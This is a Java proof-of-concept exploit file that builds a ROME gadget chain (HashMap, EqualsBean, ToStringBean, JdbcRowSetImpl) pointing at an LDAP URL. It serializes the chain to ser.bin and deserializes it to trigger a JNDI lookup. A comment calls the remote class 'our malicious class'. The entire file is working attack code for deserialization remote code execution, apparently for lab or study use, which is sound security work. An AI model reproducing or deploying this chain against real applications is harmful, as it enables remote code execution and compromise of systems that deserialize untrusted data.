import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.io.*;
import java.util.HashMap;

public class JdbcRowSetImplEXP {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        // EXP为我们的恶意类
        String url = "ldap://127.0.0.1:1389/fwxpdq";
        jdbcRowSet.setDataSourceName(url);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean, "123");

        serialize(hashMap);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
